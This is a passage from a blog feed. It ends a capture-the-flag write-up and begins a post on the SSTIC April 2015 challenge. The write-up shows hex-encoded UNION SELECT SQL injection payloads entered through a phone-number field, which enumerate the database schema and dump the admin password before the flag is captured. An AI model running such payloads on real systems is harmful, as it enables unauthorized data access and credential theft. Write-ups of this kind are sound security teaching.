We create an account to check if we can put directly a letter as DESKPHONE:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;guest ~ $ REGISTER&lt;/span&gt;
&lt;span class="code-line"&gt;Please fill the informations below :&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Login : a&lt;/span&gt;
&lt;span class="code-line"&gt;Firstname : a&lt;/span&gt;
&lt;span class="code-line"&gt;Lastname : a&lt;/span&gt;
&lt;span class="code-line"&gt;Contact (DESK PHONE) : TEST&lt;/span&gt;
&lt;span class="code-line"&gt;/!\ ERROR ! INVALID DESKPHONE NUMBER !&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This is not directly possible, we then used the hexadecimal value of TEST:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;guest ~ $ REGISTER&lt;/span&gt;
&lt;span class="code-line"&gt;Please fill the informations below :&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Login : a&lt;/span&gt;
&lt;span class="code-line"&gt;Firstname : a&lt;/span&gt;
&lt;span class="code-line"&gt;Lastname : a&lt;/span&gt;
&lt;span class="code-line"&gt;Contact (DESK PHONE) : 0x54455354&lt;/span&gt;
&lt;span class="code-line"&gt;Password : zenk&lt;/span&gt;
&lt;span class="code-line"&gt;Encrypting using 128x(ROT13) ......HAAAAAAAAX......&lt;/span&gt;
&lt;span class="code-line"&gt;Password encryption done ! (Security First) !&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;guest ~ $ SEARCH %&lt;/span&gt;
&lt;span class="code-line"&gt;+-----------+---------------+-----------+--------+&lt;/span&gt;
&lt;span class="code-line"&gt;| FIRSTNAME |    LASTNAME   | DESKPHONE | RIGHTS |&lt;/span&gt;
&lt;span class="code-line"&gt;+-----------+---------------+-----------+--------+&lt;/span&gt;
&lt;span class="code-line"&gt;|     a     |       a       |    TEST   |  user  |&lt;/span&gt;
&lt;span class="code-line"&gt;|   Wesley  |   Eshmaggle   |    4412   | admin  |&lt;/span&gt;
&lt;span class="code-line"&gt;|    Yvan   |    Delacam    |    0452   |  user  |&lt;/span&gt;
&lt;span class="code-line"&gt;|    Yvon   |     Payrir    |     A     |  user  |&lt;/span&gt;
&lt;span class="code-line"&gt;|   Zlatan  | Ibrahimovitch |    5122   |  user  |&lt;/span&gt;
&lt;span class="code-line"&gt;+-----------+---------------+-----------+--------+&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;(We can notice that the password is "Encrypted" with 128 ROT13 which is plain
text as ROT13 is symmetric).
We can inject anything in the DESKPHONE filed.&lt;/p&gt;
&lt;p&gt;One of the command is &lt;code&gt;HISTORY&lt;/code&gt;. This command list the calls history for a given
user. The coincidence is great as we can inject data in the DESKPHONE field:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;a ~ $ HISTORY&lt;/span&gt;
&lt;span class="code-line"&gt;RAPTOR CALL REPORTING&lt;/span&gt;
&lt;span class="code-line"&gt;- CLIENT INFO :&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;+-----------+------+&lt;/span&gt;
&lt;span class="code-line"&gt;|  USERNAME |  a   |&lt;/span&gt;
&lt;span class="code-line"&gt;|   RIGHTS  | user |&lt;/span&gt;
&lt;span class="code-line"&gt;| DESKPHONE | TEST |&lt;/span&gt;
&lt;span class="code-line"&gt;+-----------+------+&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;If we put an existing number as DESKPHONE, the &lt;code&gt;HISTORY&lt;/code&gt; command show us the
history of an other user. It seems to be a simple SQL injection in hexadecimal.
We try to get some informations about the database (the SQL command is in the
DESKPHONE filed):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;guest ~ $ REGISTER&lt;/span&gt;
&lt;span class="code-line"&gt;Please fill the informations below :&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Login : d&lt;/span&gt;
&lt;span class="code-line"&gt;Firstname : d&lt;/span&gt;
&lt;span class="code-line"&gt;Lastname : d&lt;/span&gt;
&lt;span class="code-line"&gt;Contact (DESK PHONE) : 0x3120554e494f4e2053454c454354207461626c655f736368656d612c7461626c655f6e616d652c636f6c756d6e5f6e616d652c6e756c6c2046524f4d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73&lt;/span&gt;
&lt;span class="code-line"&gt;Password : zenk&lt;/span&gt;
&lt;span class="code-line"&gt;Encrypting using 128x(ROT13) ......HAAAAAAAAX......&lt;/span&gt;
&lt;span class="code-line"&gt;Password encryption done ! (Security First) !&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;d ~ $ HISTORY&lt;/span&gt;
&lt;span class="code-line"&gt;RAPTOR CALL REPORTING&lt;/span&gt;
&lt;span class="code-line"&gt;- CLIENT INFO :&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;+-----------+-----------------------------------------------------------------------------------------+&lt;/span&gt;
&lt;span class="code-line"&gt;|  USERNAME |                                            d                                            |&lt;/span&gt;
&lt;span class="code-line"&gt;|   RIGHTS  |                                           user                                          |&lt;/span&gt;
&lt;span class="code-line"&gt;| DESKPHONE | 1 UNION SELECT table_schema,table_name,column_name,null FROM information_schema.columns |&lt;/span&gt;
&lt;span class="code-line"&gt;+-----------+-----------------------------------------------------------------------------------------+&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt; - CALL HISTORY&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;+--------------------+---------------------------------------+----------------------------------+----------+&lt;/span&gt;
&lt;span class="code-line"&gt;|         ID         |                  DATE                 |           DESTINATION            | DURATION |&lt;/span&gt;
&lt;span class="code-line"&gt;+--------------------+---------------------------------------+----------------------------------+----------+&lt;/span&gt;
&lt;span class="code-line"&gt;| information_schema |             CHARACTER_SETS            |        CHARACTER_SET_NAME        |   None   |&lt;/span&gt;
&lt;span class="code-line"&gt;| [...]              |             [...]                     |        [...]                     |   None   |&lt;/span&gt;
&lt;span class="code-line"&gt;|    x_8816665166    |                 users                 |                id                |   None   |&lt;/span&gt;
&lt;span class="code-line"&gt;|    x_8816665166    |                 users                 |            firstname             |   None   |&lt;/span&gt;
&lt;span class="code-line"&gt;|    x_8816665166    |                 users                 |               name               |   None   |&lt;/span&gt;
&lt;span class="code-line"&gt;|    x_8816665166    |                 users                 |             contact              |   None   |&lt;/span&gt;
&lt;span class="code-line"&gt;|    x_8816665166    |                 users                 |             password             |   None   |&lt;/span&gt;
&lt;span class="code-line"&gt;|    x_8816665166    |                 users                 |              login               |   None   |&lt;/span&gt;
&lt;span class="code-line"&gt;|    x_8816665166    |                 users                 |              rights              |   None   |&lt;/span&gt;
&lt;span class="code-line"&gt;+--------------------+---------------------------------------+----------------------------------+----------+&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We get the admin password:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;guest ~ $ REGISTER&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;Please fill the informations below :&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;Login : i&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;Firstname : i&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;Lastname : i&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;Contact (DESK PHONE) : 0x3120554e494f4e2053454c454354206c6f67696e2c70617373776f72642c7269676874732c6e756c6c2046524f4d207573657273205748455245207269676874733d2761646d696e27&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;Password : i&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;Encrypting using 128x(ROT13) &lt;/span&gt;&lt;span class="nt"&gt;......&lt;/span&gt;&lt;span class="c"&gt;HAAAAAAAAX&lt;/span&gt;&lt;span class="nt"&gt;......&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;Password encryption done ! (Security First) !&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;i ~ $ HISTORY&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;RAPTOR CALL REPORTING&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;-&lt;/span&gt;&lt;span class="c"&gt; CLIENT INFO :&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;+-----------+---------------------------------------------------------------------------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;|  USERNAME |                                     i                                     |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;|   RIGHTS  |                                    user                                   |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;| DESKPHONE | 1 UNION SELECT login&lt;/span&gt;&lt;span class="nt"&gt;,&lt;/span&gt;&lt;span class="c"&gt;password&lt;/span&gt;&lt;span class="nt"&gt;,&lt;/span&gt;&lt;span class="c"&gt;rights&lt;/span&gt;&lt;span class="nt"&gt;,&lt;/span&gt;&lt;span class="c"&gt;null FROM users WHERE rights=&amp;#39;admin&amp;#39; |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;+-----------+---------------------------------------------------------------------------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt; &lt;/span&gt;&lt;span class="nb"&gt;-&lt;/span&gt;&lt;span class="c"&gt; CALL HISTORY&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;+-------------+------------+-------------+----------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;|      ID     |    DATE    | DESTINATION | DURATION |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;+-------------+------------+-------------+----------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;| w&lt;/span&gt;&lt;span class="nt"&gt;.&lt;/span&gt;&lt;span class="c"&gt;eshmaggle | Hanlbatard |    admin    |   None   |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;+-------------+------------+-------------+----------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We login as the admin user and user the &lt;code&gt;RSHELL&lt;/code&gt; command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;guest ~ $ AUTH w.eshmaggle Hanlbatard&lt;/span&gt;
&lt;span class="code-line"&gt;Welcome w.eshmaggle !&lt;/span&gt;
&lt;span class="code-line"&gt;w.eshmaggle ~ $ RSHELL&lt;/span&gt;
&lt;span class="code-line"&gt;Ok, ok good job. You are admin... The flag is : 0eb80d9c2cdee95b461cf0b70d40791f&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Flag: 0eb80d9c2cdee95b461cf0b70d40791f&lt;/strong&gt;&lt;/p&gt;</content><category term="Security"></category><category term="ndh"></category><category term="ctf"></category><category term="security"></category></entry><entry><title>First April SSTIC challenge</title><link href="https://maggick.fr/2015/04/first-april-sstic-challenge.html" rel="alternate"></link><published>2015-04-02T00:00:00+02:00</published><updated>2015-04-02T00:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2015-04-02:/2015/04/first-april-sstic-challenge.html</id><summary type="html">&lt;p&gt;&lt;img alt="pixel view, resolution 750" class="align-left" src="/media/2015.04/sstic_res_750.PNG" width="172"/&gt;&lt;/p&gt;
&lt;p&gt;The first of April is always the occasion for some great pranks.
2015 was a great year, as the CERN confirmed the existence of the Force, Google
published a mirroring website and gentoo an old fashion one.
In France we got a security event call &lt;a href="https://www.sstic.org"&gt;SSTIC&lt;/a&gt; for which
the tickets are very rare therefore the SSTIC challenge allows the ones with the
flag to reserve a ticket. An April prank challenge was post yesterday.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2015.04/sstic_res_750.PNG"
alt="pixel view, resolution 750" width="172"&gt;&lt;/p&gt;
&lt;p&gt;The first of April is always the occasion for some great pranks.
2015 was a great year, as the CERN confirmed the existence of the Force, Google
published a mirroring website and gentoo an old fashion one.
In France we got a security event call &lt;a href="https://www.sstic.org"&gt;SSTIC&lt;/a&gt; for which
the tickets are very rare therefore the SSTIC challenge allows the ones with the
flag to reserve a ticket. An April prank challenge was post yesterday.&lt;/p&gt;


&lt;p&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;/p&gt;
&lt;h1 id="april-pranks"&gt;April Pranks&lt;/h1&gt;
&lt;p&gt;The first of April is always the occasion for some great pranks:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://twitter.com/CERN/status/583147747710263296"&gt;CERN confirm the existence of the Force&lt;/a&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="CERN tweet about the Force" src="/media/2015.04/twitter.com_CERN_status_583147747710263296.PNG"&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Google do some mirroring trick(deadlink):&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="com.google mirrored" src="/media/2015.04/com.google.PNG"&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.gentoo.org"&gt;gentoo.org adopted a beautiful design&lt;/a&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="gentoo.org old school" src="/media/2015.04/gentoo.org.PNG"&gt;&lt;/p&gt;
&lt;h1 id="sstic-challenge"&gt;SSTIC Challenge&lt;/h1&gt;
&lt;p&gt;But one of them was released by the &lt;a href="https://www.sstic.org"&gt;SSTIC&lt;/a&gt; an French
security event which give every year a difficult challenge that grant
automatically a place to the event (tickets are sold out in approximately one
minute) for the winners.&lt;/p&gt;
&lt;p&gt;We download the challenge &lt;a href="/media/2015.04/chlg-2015"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id="strings"&gt;Strings&lt;/h2&gt;
&lt;p&gt;Let's try something like &lt;code&gt;strings&lt;/code&gt; to see what appends:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;maggick&lt;/span&gt;&lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="n"&gt;debian&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~/&lt;/span&gt;&lt;span class="n"&gt;work&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sstic&lt;/span&gt;$&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;strings&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;chlg&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;wc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;10797&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;maggick@debian:~/work/sstic$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;strings&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;chlg-2015&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;head&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Salted__D&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;8&lt;/span&gt;&lt;span class="o"&gt;&amp;#39;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;vKRbn&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;vKRbn&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;vKRbn&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;vKRbn&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;K5G&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;9&lt;span class="n"&gt;S&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;%Pz$&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;vKRbn&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;vKRb&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;No chance coming from here.&lt;/p&gt;
&lt;h2 id="hexview"&gt;Hexview&lt;/h2&gt;
&lt;p&gt;We use radare2 to see the hexcode:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[0x00000000 0% 1008 chlg-2015]&amp;gt; x&lt;/span&gt;
&lt;span class="code-line"&gt;- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF&lt;/span&gt;
&lt;span class="code-line"&gt;0x00000000  5361 6c74 6564 5f5f 4419 80b6 425f d4ff  Salted__D...B_..&lt;/span&gt;
&lt;span class="code-line"&gt;0x00000010  1e5c 83a1 c4d7 24f5 4697 9aac 2571 5f8e  .\....$.F...%q_.&lt;/span&gt;
&lt;span class="code-line"&gt;0x00000020  64e2 52ad 8947 119e c4ad 929b 6505 4de2  d.R..G......e.M.&lt;/span&gt;
&lt;span class="code-line"&gt;0x00000030  ff44 0add d438 273c 4b8d 760d 416d c883  .D...8&amp;#39;&amp;lt;K.v.Am..&lt;/span&gt;
&lt;span class="code-line"&gt;0x00000040  290e 8014 1ce7 88a2 b6c7 cd00 d8e9 98bd  )...............&lt;/span&gt;
&lt;span class="code-line"&gt;0x00000050  e40c cb76 4b52 626e 0ee0 c966 b1c8 c24b  ...vKRbn...f...K&lt;/span&gt;
&lt;span class="code-line"&gt;0x00000060  e40c cb76 4b52 626e 0ee0 c966 b1c8 c24b  ...vKRbn...f...K&lt;/span&gt;
&lt;span class="code-line"&gt;0x00000070  4915 cd03 153c 5210 abe7 c68f c882 f198  I....&amp;lt;R.........&lt;/span&gt;
&lt;span class="code-line"&gt;0x00000080  f153 28d9 ef43 0ecc d38a 8cc7 7cff 5351  .S(..C......|.SQ&lt;/span&gt;
&lt;span class="code-line"&gt;0x00000090  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.&lt;/span&gt;
&lt;span class="code-line"&gt;0x000000a0  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.&lt;/span&gt;
&lt;span class="code-line"&gt;0x000000b0  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.&lt;/span&gt;
&lt;span class="code-line"&gt;0x000000c0  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.&lt;/span&gt;
&lt;span class="code-line"&gt;0x000000d0  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.&lt;/span&gt;
&lt;span class="code-line"&gt;0x000000e0  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.&lt;/span&gt;
&lt;span class="code-line"&gt;0x000000f0  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.&lt;/span&gt;
&lt;span class="code-line"&gt;0x00000100  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.&lt;/span&gt;
&lt;span class="code-line"&gt;0x00000110  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.&lt;/span&gt;
&lt;span class="code-line"&gt;0x00000120  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.&lt;/span&gt;
&lt;span class="code-line"&gt;0x00000130  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.&lt;/span&gt;
&lt;span class="code-line"&gt;0x00000140  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.&lt;/span&gt;
&lt;span class="code-line"&gt;0x00000150  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Yeah that a message encrypt with open ssl and salt. But we do not have any idea
about the key nor the salt. Shall we take a look at the code itself:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;0x00000000 0% 315 chlg-2015&lt;/span&gt;&lt;span class="o"&gt;]&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;pd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="mh"&gt;0x00000000&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;53&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;push&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ebx&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="mh"&gt;0x00000001&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;61&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;popal&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="mh"&gt;0x00000002&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;insb&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;byte&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;es&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;edi&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dx&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;=&amp;lt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x00000003&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;7465&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="n"&gt;je&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x6a&lt;/span&gt;&lt;span class="w"&gt;                          &lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000005&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;645&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="n"&gt;pop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;edi&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000007&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;pop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;edi&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mh"&gt;0x00000008&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;44&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;inc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;esp&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
